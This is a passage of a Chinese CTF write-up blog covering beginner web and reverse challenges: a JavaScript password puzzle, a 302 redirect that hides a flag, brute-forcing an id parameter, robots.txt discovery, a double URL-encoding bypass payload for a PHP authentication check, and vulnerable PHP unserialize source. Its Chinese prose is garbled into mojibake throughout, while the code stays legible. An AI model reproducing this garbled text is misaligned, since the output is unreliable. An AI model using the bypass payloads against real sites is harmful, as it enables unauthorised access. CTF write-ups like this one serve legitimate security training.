class="variable">dechiffre</span>çš„å‚æ•°<span class="variable">pass_enc</span>æ˜¯æ²¡æœ‰ä»»ä½•æ„ä¹‰çš„</span><br><span class="line"></span><br><span class="line">ä¸‰ã€<span class="variable">dechiffre</span>å‡½æ•°æ‰§è¡Œå®Œæˆåï¼Œç»§ç»­æ‰§è¡Œå…¶å®ƒçš„ä»£ç </span><br><span class="line"><span class="variable">h</span> <span class="operator">=</span> <span class="variable">window</span>.<span class="property">prompt</span>(&#x27;<span class="title class_">Enter</span> <span class="variable">password</span>&#x27;);</span><br><span class="line">    <span class="title function_">alert</span>( <span class="title function_">dechiffre</span>(<span class="variable">h</span>) );</span><br><span class="line"><span class="variable">h</span><span class="operator">=</span>ä½ è¾“å…¥å¼¹æ¡†å†…çš„å†…å®¹</span><br><span class="line">ä¹‹å<span class="variable">alert</span>å¼¹å‡º<span class="title function_">dechiffre</span>(<span class="variable">h</span>)çš„å€¼ï¼Œç”±å‰é¢æ‰€æœ‰çš„ä»£ç å¯çŸ¥ï¼Œä»£ç é‡Œ<span class="variable">p</span>çš„å€¼ä¸<span class="variable">tab</span>æ— å…³ï¼Œå› ä¸ºæœ€ç»ˆéƒ½ä¼šè¢«<span class="variable">tab2</span>çš„å€¼æ›¿ä»£ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— è®ºè¾“å…¥ä»€ä¹ˆï¼Œä¹Ÿå°±æ˜¯<span class="variable">pass_enc</span><span class="operator">=</span><span class="variable">h</span>ï¼Œæ— è®ºè¾“å…¥çš„è¿™ä¸ª<span class="variable">h</span>ç­‰äºä»€ä¹ˆï¼Œä¸ç®¡<span class="variable">tab</span>èƒ½å¦è¢«åˆ†å‰²æˆå­—ç¬¦ä¸²æ•°ç»„ï¼Œæ˜¯å¦å­˜åœ¨ï¼Œéƒ½åªä¼šåˆ©ç”¨åˆ°<span class="variable">tab2</span>ã€‚é€šä¿—ç‚¹è®²ï¼Œæœ‰å…³<span class="variable">tab</span>çš„å‚æ•°ä¸å€¼éƒ½å¯ä»¥è§†ä¸ºæ²¡æœ‰ï¼Œå› æ­¤ï¼Œ<span class="variable">pass_enc</span>å‚æ•°æ˜¯ä»€ä¹ˆä¹Ÿå°±æ²¡æœ‰æ„ä¹‰äº†</span><br><span class="line"></span><br><span class="line">å››ã€æœ€åï¼Œç»“è®ºå°±æ˜¯ï¼Œæ— è®ºæˆ‘ä»¬åœ¨å¼¹æ¡†ä¸­è¾“å…¥ä»€ä¹ˆå€¼ï¼Œéƒ½åªä¼šè¿”å›<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span></span><br><span class="line">æˆ‘å°±çŒœæƒ³ï¼Œä¼šä¸ä¼š<span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;<span class="char escape_">\x35</span><span class="char escape_">\x35</span>\x2c<span class="char escape_">\x35</span><span class="char escape_">\x36</span>\x2c<span class="char escape_">\x35</span><span class="char escape_">\x34</span>\x2c<span class="char escape_">\x37</span><span class="char escape_">\x39</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x31</span><span class="char escape_">\x35</span>\x2c<span class="char escape_">\x36</span><span class="char escape_">\x39</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x31</span><span class="char escape_">\x34</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x31</span><span class="char escape_">\x36</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x30</span><span class="char escape_">\x37</span>\x2c<span class="char escape_">\x34</span><span class="char escape_">\x39</span>\x2c<span class="char escape_">\x35</span><span class="char escape_">\x30</span>&quot;</span>));è¿™ä¸ªè¯­æ³•é”™è¯¯ï¼Œå¹¶ä¸”æ²¡æœ‰æ²¡è®¡ç®—å‡ºæ¥çš„æ˜¯ä¸æ˜¯æœ€åæ­£ç¡®çš„å€¼ï¼Œä¹Ÿå°±æ˜¯<span class="variable">flag</span><span class="operator">~</span></span><br><span class="line">äºæ˜¯ï¼Œæˆ‘ä¸ç”¨å®ƒè¿™ä¹ˆæ— è®º<span class="variable">pass_enc</span>å‚æ•°è¾“å…¥ä»€ä¹ˆéƒ½æ˜¾ç¤º<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span>çš„å‡½æ•°ï¼Œå’±ä¹ŸæŠ›å¼ƒå®ƒä¸€å›ï¼Œè‡ªå·±é‡æ–°å†™ä»£ç æ‰§è¡Œå®ƒ</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">!</span><span class="variable">DOCTYPE</span> <span class="variable">html</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">html</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">head</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">meta</span> <span class="variable">charset</span><span class="operator">=</span><span class="string">&quot;utf-8&quot;</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">head</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">body</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">script</span><span class="operator">&gt;</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">n</span><span class="operator">=</span><span class="title class_">String</span>.<span class="property">fromCharCode</span>(<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>);</span><br><span class="line">    <span class="variable">document</span>.<span class="property">write</span>(<span class="variable">n</span>);</span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">script</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">body</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">html</span><span class="operator">&gt;</span></span><br><span class="line">æœ€åç»“æœä¸ºï¼š<span class="number">786</span>OsErtk12</span><br><span class="line">æ ¹æ®æç¤ºçš„<span class="variable">flag</span>æ ¼å¼è¾“å…¥æœ€åçš„<span class="variable">flag</span>ï¼</span><br></pre></td></tr></table></figure>

<p>æ³¨ï¼š</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">(<span class="number">1</span>)<span class="built_in">split</span>() æ–¹æ³•ç”¨äºæŠŠä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²æˆå­—ç¬¦ä¸²æ•°ç»„</span><br><span class="line">è¯­æ³•ï¼š<span class="built_in">string</span>.<span class="built_in">split</span>(separator,<span class="built_in">limit</span>)</span><br><span class="line">å‚æ•°                 æè¿°</span><br><span class="line">separator        å¯é€‰ã€‚å­—ç¬¦ä¸²æˆ–æ­£åˆ™è¡¨è¾¾å¼ï¼Œä»è¯¥å‚æ•°æŒ‡å®šçš„åœ°æ–¹åˆ†å‰² <span class="built_in">string</span> Objectã€‚æ¯”å¦‚æ­¤é¢˜ä»¥é€—å·åˆ†å‰²æˆå­—ç¬¦ä¸²æ•°ç»„</span><br><span class="line"><span class="built_in">limit</span>            å¯é€‰ã€‚è¯¥å‚æ•°å¯æŒ‡å®šè¿”å›çš„æ•°ç»„çš„æœ€å¤§é•¿åº¦ã€‚å¦‚æœè®¾ç½®äº†è¯¥å‚æ•°ï¼Œè¿”å›çš„å­ä¸²ä¸ä¼šå¤šäºè¿™ä¸ªå‚æ•°æŒ‡å®šçš„æ•°ç»„ã€‚å¦‚æœæ²¡æœ‰è®¾ç½®è¯¥å‚æ•°ï¼Œæ•´ä¸ªå­—ç¬¦ä¸²éƒ½ä¼šè¢«åˆ†å‰²ï¼Œä¸è€ƒè™‘å®ƒçš„é•¿åº¦ã€‚</span><br><span class="line">ä¸¾ä¾‹ï¼šstr=<span class="string">&quot;a,b,c,d,e,f,g&quot;</span>;</span><br><span class="line"><span class="built_in">var</span> 1st = str.<span class="built_in">split</span>(<span class="string">&quot;,&quot;</span>,<span class="number">3</span>);   å¯¹strä»¥é€—å·è¿›è¡Œåˆ†å‰²ï¼Œåˆ†å‰²åçš„å­—ç¬¦ä¸²æ•°ç»„å†…çš„å€¼æœ€å¤šåªèƒ½æœ‰<span class="number">3</span>ä¸ªï¼Œç»“æœå°±æ˜¯1st = [a,b,c]</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)<span class="keyword">for</span> å¾ªç¯çš„è¯­æ³•å¦‚ä¸‹ï¼š</span><br><span class="line"><span class="keyword">for</span> (è¯­å¥ <span class="number">1</span>; è¯­å¥ <span class="number">2</span>; è¯­å¥ <span class="number">3</span>) &#123;</span><br><span class="line">     è¦æ‰§è¡Œçš„ä»£ç å—</span><br><span class="line">&#125;</span><br><span class="line">è¯­å¥ <span class="number">1</span> åœ¨å¾ªç¯ï¼ˆä»£ç å—ï¼‰å¼€å§‹ä¹‹å‰æ‰§è¡Œã€‚</span><br><span class="line">è¯­å¥ <span class="number">2</span> å®šä¹‰è¿è¡Œå¾ªç¯ï¼ˆä»£ç å—ï¼‰çš„æ¡ä»¶ã€‚</span><br><span class="line">è¯­å¥ <span class="number">3</span> ä¼šåœ¨å¾ªç¯ï¼ˆä»£ç å—ï¼‰æ¯æ¬¡è¢«æ‰§è¡Œåæ‰§è¡Œã€‚</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)fromCharCode() å¯æ¥å—ä¸€ä¸ªæŒ‡å®šçš„ Unicode å€¼ï¼Œç„¶åè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</span><br><span class="line">è¯­æ³•ï¼šString.fromCharCode(n1, n2, ..., nX)</span><br><span class="line">å‚æ•°                 æè¿°</span><br><span class="line">n1, n2, ..., nX     å¿…éœ€ã€‚ä¸€ä¸ªæˆ–å¤šä¸ª Unicode å€¼ï¼Œå³è¦åˆ›å»ºçš„å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦çš„ Unicode ç¼–ç ã€‚</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)<span class="built_in">prompt</span>()æ–¹æ³•ç”¨äºæ˜¾ç¤ºå¯æç¤ºç”¨æˆ·è¿›è¡Œè¾“å…¥çš„å¯¹è¯æ¡†ã€‚</span><br><span class="line">è¿™ä¸ªæ–¹æ³•è¿”å›ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²</span><br><span class="line">è¯­æ³•ï¼š<span class="built_in">prompt</span>(msg,defaultText)</span><br><span class="line">å‚æ•°                æè¿°</span><br><span class="line">msg                å¯é€‰ã€‚è¦åœ¨å¯¹è¯æ¡†ä¸­æ˜¾ç¤ºçš„çº¯æ–‡æœ¬ï¼ˆè€Œä¸æ˜¯ HTML æ ¼å¼çš„æ–‡æœ¬ï¼‰å°±æ˜¯å¼¹æ¡†æ˜¾ç¤ºæ–‡æœ¬ã€‚</span><br><span class="line">defaultText        å¯é€‰ã€‚é»˜è®¤çš„è¾“å…¥æ–‡æœ¬ï¼Œä½ è¾“å…¥ä»€ä¹ˆå¼¹æ¡†ä¸€å¼€å§‹å‡ºç°é‡Œé¢çš„è¾“å…¥æ¡†å°±ä¼šé»˜è®¤æ˜¾ç¤ºä½ è¿™ä¸ªæ–‡æœ¬ã€‚</span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)<span class="built_in">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;</span><br><span class="line">è¿™ä¸ªè¡¨ç¤ºå£°æ˜å˜é‡i,j,k,l,m,n,o,pï¼Œåªæœ‰lå’Œpä¸¤ä¸ªå˜é‡è¢«èµ‹å€¼äº†ï¼Œå…¶å®ƒçš„å˜é‡éƒ½æ˜¯ä¸å¸¦å€¼çš„ï¼Œä¸å¸¦æœ‰å€¼çš„å˜é‡ï¼Œå®ƒçš„å€¼å°†æ˜¯undefinedï¼Œåç»­ä»£ç ä¸­å¯ä»¥ç»™å®ƒèµ‹å€¼ã€‚</span><br><span class="line"></span><br><span class="line">(<span class="number">6</span>)<span class="built_in">length</span></span><br><span class="line"><span class="built_in">length</span> å±æ€§å¯è®¾ç½®æˆ–è¿”å›æ•°ç»„ä¸­å…ƒç´ çš„æ•°ç›®ã€‚</span><br></pre></td></tr></table></figure>

<h1 id="Webè¿›é˜¶"><a href="#Webè¿›é˜¶" class="headerlink" title="Webè¿›é˜¶"></a>Webè¿›é˜¶</h1><h2 id="1-baby-web"><a href="#1-baby-web" class="headerlink" title="1.baby_web"></a>1.baby_web</h2><h3 id="1-é¢˜ç›®æè¿°-11"><a href="#1-é¢˜ç›®æè¿°-11" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æƒ³æƒ³åˆå§‹é¡µé¢æ˜¯å“ªä¸ª</p>
<h3 id="2-wp-9"><a href="#2-wp-9" class="headerlink" title="2)wp"></a>2)wp</h3><p> å¼€å§‹ç•Œé¢å¦‚ä¸‹</p>
<p><img src="/post/wp-Gongfang/image-20220625162533345.png" alt="image-20220625162533345"></p>
<p>æ²¡æœ‰å¤´ç»ªï¼Œä½†æ˜¯æè¿°é‡Œæœ‰é¦–é¡µï¼Œå†æ ¹æ®urlçŸ¥é“è¿™æ˜¯ä¸ªphpç½‘ç«™</p>
<p>phpç½‘ç«™é¦–é¡µæ–‡ä»¶å°±æ˜¯index.php</p>
<p><code>index.phpæ–‡ä»¶æ˜¯ä¸€ä¸ªphpç½‘ç«™é¦–é¡µæ–‡ä»¶ï¼Œindexæ˜¯æ™®éæ„ä¹‰ä¸Šçš„â€œé¦–é¡µâ€ï¼Œä¹Ÿå°±æ˜¯ä½ è¾“å…¥ä¸€ä¸ªåŸŸååä¼šæ‰“å¼€ä¸€ä¸ªé¡µé¢ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯index.xxxxï¼ˆåŸºæœ¬ä¸Šé¦–é¡µéƒ½ä¸ä¼šæŠŠindex.xxxxæ˜¾ç¤ºåœ¨urlé‡Œï¼Œä½†ä¹Ÿä¸ç»å¯¹ï¼‰</code></p>
<p>è¯•è¯•<code>111.200.241.244:59074/index.php</code></p>
<p>ç»“æœåˆä¼šåˆ°1.phpï¼Œurlåˆå˜æˆ<code>111.200.241.244:59074/1.php</code></p>
<p>F12æ‰“å¼€æŸ¥çœ‹ç½‘ç»œ</p>
<p><img src="/post/wp-Gongfang/image-20220625171731934.png" alt="image-20220625171731934"></p>
<p><code>è¡¥å……ï¼š</code></p>
<p> <code>index.phpçš„çŠ¶æ€æ˜¯302ä»€ä¹ˆæ„æ€ï¼Ÿ</code></p>
<p><code>302 Foundï¼ŒåŸå§‹æè¿°çŸ­è¯­ä¸º Moved Temporarily(ä¸´æ—¶æ¬å®¶ï¼‰ ï¼Œæ˜¯[HTTPåè®®](https://baike.baidu.com/item/HTTPåè®®)ä¸­çš„ä¸€ä¸ªçŠ¶æ€ç (Status Code)ã€‚å¯ä»¥ç®€å•çš„ç†è§£ä¸ºè¯¥èµ„æºåŸæœ¬ç¡®å®å­˜åœ¨ï¼Œä½†å·²ç»è¢«**ä¸´æ—¶**æ”¹å˜äº†ä½ç½®ï¼›æ¢è€Œè¨€ä¹‹ï¼Œå°±æ˜¯è¯·æ±‚çš„èµ„æºæš‚æ—¶é©»ç•™åœ¨ä¸åŒçš„URIä¸‹ï¼Œæ•…è€Œé™¤éç‰¹åˆ«æŒ‡å®šäº†ç¼“å­˜å¤´éƒ¨æŒ‡ç¤ºï¼Œè¯¥çŠ¶æ€ç ä¸å¯ç¼“å­˜ã€‚</code></p>
<p>å‘ç°ç¡®å®æ˜¯è·³è½¬åˆ°äº†index.phpä½†ä¸ºä»€ä¹ˆåˆå›åˆ°1.php</p>
<p><img src="/post/wp-Gongfang/image-20220625171819943.png" alt="image-20220625171819943"></p>
<p>å¯ä»¥çœ‹åˆ°location:1.phpï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ— æ³•ç›´æ¥è®¿é—®index.phpçš„åŸå› ï¼Œä½†flagå·²ç»å¾—åˆ°</p>
<p>å¾—åˆ°flag</p>
<hr>
<p>å¦‚æœç”¨burpsuiteæŸ¥çœ‹<code>111.200.241.244:59074/index.php</code>ï¼Œåªèƒ½çœ‹åˆ°Flag is hidden!ï¼Œä¹Ÿç®—æ˜¯æç¤º</p>
<p><img src="/post/wp-Gongfang/image-20220625172122211.png" alt="image-20220625172122211"></p>
<h2 id="2-ics-06"><a href="#2-ics-06" class="headerlink" title="2.ics-06"></a>2.ics-06</h2><h3 id="1-é¢˜ç›®æè¿°-12"><a href="#1-é¢˜ç›®æè¿°-12" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>äº‘å¹³å°æŠ¥è¡¨ä¸­å¿ƒæ”¶é›†äº†è®¾å¤‡ç®¡ç†åŸºç¡€æœåŠ¡çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®è¢«åˆ é™¤äº†ï¼Œåªæœ‰ä¸€å¤„ç•™ä¸‹äº†å…¥ä¾µè€…çš„ç—•è¿¹ã€‚</p>
<h3 id="2-wp-10"><a href="#2-wp-10" class="headerlink" title="2)wp"></a>2)wp</h3><p>æ‰“å¼€ç•Œé¢æœ‰äº›å“äºº</p>
<p><img src="/post/wp-Gongfang/image-20220626084029917.png" alt="image-20220626084029917"></p>
<p>ä½†åªæœ‰æŠ¥è¡¨ä¸­å¿ƒèƒ½æ‰“å¼€</p>
<p><img src="/post/wp-Gongfang/image-20220626084102777.png" alt="image-20220626084102777"></p>
<p>çœ‹åˆ°urlå°±æœ‰æ€è·¯äº†ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•idçˆ†ç ´</p>
<p><img src="/post/wp-Gongfang/image-20220626084318243.png" alt="image-20220626084318243"></p>
<p>åˆ©ç”¨Numbersæ–¹å¼ï¼Œä»1åˆ°5000ï¼Œå‘ç°2333å¤„æˆåŠŸçˆ†ç ´</p>
<p>å¾—åˆ°flag</p>
<h2 id="3-Training-WWW-Robots"><a href="#3-Training-WWW-Robots" class="headerlink" title="3.Training-WWW-Robots"></a>3.Training-WWW-Robots</h2><h3 id="1-é¢˜ç›®æè¿°-13"><a href="#1-é¢˜ç›®æè¿°-13" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-11"><a href="#2-wp-11" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿™é“é¢˜å’Œä¸Šé¢æ–°æ‰‹åŒºçš„é¢˜ç±»ä¼¼</p>
<p>å…ˆè®¿é—®<code>http://111.200.241.244:51820/robots.txt</code>å¾—åˆ°phpæ–‡ä»¶å</p>
<p><img src="/post/wp-Gongfang/image-20220626090904204.png" alt="image-20220626090904204"></p>
<p>äºæ˜¯è®¿é—®<code>http://111.200.241.244:51820/fl0g.php/robots.txt</code></p>
<p>å¾—åˆ°flag</p>
<h2 id="4-PHP2"><a href="#4-PHP2" class="headerlink" title="4.PHP2"></a>4.PHP2</h2><h3 id="1-é¢˜ç›®æè¿°-14"><a href="#1-é¢˜ç›®æè¿°-14" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-12"><a href="#2-wp-12" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿™å¥è¯çš„æ„æ€æ˜¯â€ä½ èƒ½è¯æ˜è¿™ä¸ªç½‘ç«™å­˜åœ¨å—â€œ</p>
<p><img src="/post/wp-Gongfang/image-20220626104943938.png" alt="image-20220626104943938"></p>
<p>æ²¡æœ‰æ€è·¯ï¼ŒæŠ“åŒ…ï¼Œå’Œå¾¡å‰‘ã€dirsearchéƒ½æ²¡åˆå¾—åˆ°æƒ³è¦çš„ç»“æœ</p>
<p>æ²¡æœ‰åŠæ³•ï¼Œæœäº†ä¸€ä¸‹å¤§ä½¬ä»¬çš„wp</p>
<p>äº†è§£åˆ°äº†ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹phps</p>
<p><code>phpså³ä¸ºPHP Sourceï¼šphpsæ–‡ä»¶å°±æ˜¯phpçš„æºä»£ç æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºæä¾›ç»™ç”¨æˆ·ï¼ˆè®¿é—®è€…ï¼‰æŸ¥çœ‹phpä»£ç ï¼Œå› ä¸ºç”¨æˆ·æ— æ³•ç›´æ¥é€šè¿‡Webæµè§ˆå™¨çœ‹åˆ°phpæ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€ä»¥éœ€è¦ç”¨phpsæ–‡ä»¶ä»£æ›¿ã€‚å…¶å®ï¼Œåªè¦ä¸ç”¨phpç­‰å·²ç»åœ¨æœåŠ¡å™¨ä¸­æ³¨å†Œè¿‡çš„MIMEç±»å‹ä¸ºæ–‡ä»¶å³å¯ï¼Œä½†ä¸ºäº†å›½é™…é€šç”¨ï¼Œæ‰€ä»¥æ‰ç”¨äº†phpsæ–‡ä»¶ç±»å‹ã€‚</code></p>
<p>è®¿é—®<code>http://111.200.241.244:51703/index.phps</code>ï¼Œå¾—åˆ°æºç å†…å®¹</p>
<p><img src="/post/wp-Gongfang/image-20220626105416606.png" alt="image-20220626105416606"></p>
<p>å³é”®æŸ¥çœ‹æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®ä»£ç çŸ¥é“ï¼Œå½“id&#x3D;adminï¼Œè¾“å‡ºnot allowed!ï¼Œä½†æ˜¯æƒ³è¦è¾“å‡ºflag</p>
<p>å°±éœ€è¦æ³¨æ„è¿™å¥è¯­å¥<code>$_GET[id] = urldecode($_GET[id]);</code></p>
<p><code>urldecode:æœ¬å‡½æ•°å¯¹å­—ç¬¦ä¸²è¿›è¡ŒURLè§£ç ã€‚ä¾‹å¦‚é€šè¿‡urlencodeç¼–ç åçš„å­—ç¬¦ä¸²ï¼Œå¯é€šè¿‡UrlDecodeè¿›è¡Œè§£ç ã€‚å¯¹Urlè·¯å¾„åŠ ç çš„å‡½æ•°æ˜¯UrlEncode  ç”¨æ³•ç›¸åï¼Œå’ŒUrlDecodeæ˜¯ä¸€è‡´å¯¹åº”çš„</code></p>
<p>è¿™é‡Œæˆ‘ä»¬å°±æ¸…æ¥šäº†ï¼Œéœ€è¦æŠŠadminè¿›è¡Œurlç¼–ç ï¼Œä½†æ˜¯åªå¯¹å…¶è¿›è¡Œä¸€æ¬¡ç¼–ç ï¼Œè¦çŸ¥é“ç½‘ç«™æœ¬èº«å¯¹urlç¼–ç å°±æœ‰è§£ç çš„èƒ½åŠ›ï¼Œä¹Ÿå°±æ˜¯åœ¨urldecodeå‡½æ•°æ‰§è¡Œä¹‹å‰ï¼Œç½‘ç«™å·²ç»æŠŠç¼–ç è§£ç ä¸ºadminï¼Œä»è€Œåªè¾“å‡ºnot allowed!</p>
<p>æ‰€ä»¥ï¼Œè¿™é‡Œéœ€è¦å¯¹adminè¿›è¡Œä¸¤æ¬¡ç¼–ç ï¼Œç¬¬ä¸€è¢«ç½‘ç«™è§£ç ï¼Œç»•è¿‡ç¬¬ä¸€ä¸ªifï¼Œç„¶ååœ¨urldecodeå‡½æ•°é‡Œè¿›è¡Œç¬¬äºŒæ¬¡è§£ç ï¼Œå˜æˆadminï¼Œä»è€Œè¾“å‡ºKey(flag)</p>
<p>äºæ˜¯è®¿é—®<code>http://111.200.241.244:51703/index.php?id=%25%36%31dmin</code></p>
<p>è¿™é‡Œçš„%25%36%31æ˜¯å­—æ¯açš„äºŒæ¬¡urlç¼–ç ç”±aç¬¬ä¸€æ¬¡ç¼–ç ç»“æœ%61å†æ¬¡ç¼–ç è€Œæˆ</p>
<p>â€“ä¸ºäº†payloadç®€æ´ï¼Œä¸€èˆ¬åªç¼–ç ä¸€ä¸ªå­—æ¯</p>
<p><img src="/post/wp-Gongfang/image-20220626110642311.png" alt="image-20220626110642311"></p>
<p>å¾—åˆ°flag</p>
<h2 id="5-Web-python-template-injection"><a href="#5-Web-python-template-injection" class="headerlink" title="5.Web_python_template_injection"></a>5.Web_python_template_injection</h2><p>è¯¥é¢˜å±äºsstiï¼Œå»ºè®®å…ˆäº†è§£ä¸€äº›<a href="../../../../2022/05/28/Web-study">ssti</a>çš„æ¨¡æ¿æ³¨å…¥ï¼Œå’Œè¿™ä¸¤ç¯‡æ–‡ç« äº†è§£ä¸€äº›flaskè¿è¡ŒåŸç†</p>
<p><a href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a>  </p>
<p><a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
<p>ç„¶åå†åšè¿™é“é¢˜</p>
<p><a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">å¤§ä½¬wp</a></p>
<h2 id="6-Web-php-unserialize"><a href="#6-Web-php-unserialize" class="headerlink" title="6.Web_php_unserialize"></a>6.Web_php_unserialize</h2><h3 id="1-é¢˜ç›®æè¿°-15"><a href="#1-é¢˜ç›®æè¿°-15" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-13"><a href="#2-wp-13" class="headerlink" title="2)wp"></a>2)wp</h3><p>çœ‹åå­—å¯çŸ¥ï¼Œè¿™æ˜¯é“<a href="../../../../2022/05/28/Web-study">phpååºåˆ—åŒ–</a>ç±»å‹çš„é¢˜</p>
<p>å¼€å§‹å…ˆåˆ†æä¸€ä¸‹phpä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/yanbai3/article/details/122300480">phpä»£ç å®¡è®¡åŸæ–‡é“¾æ¥</a></p>
<p>é¦–å…ˆå®šä¹‰äº†Demoç±»ï¼Œåœ¨ç±»ä¸­å®šä¹‰äº†å‡ ä¸ªæ–¹æ³•<code>construct()wakeup()destruct()</code>ã€‚åœ¨è¿™é‡Œæˆ‘ä»¬è¦çŸ¥é“ï¼Œ</p>
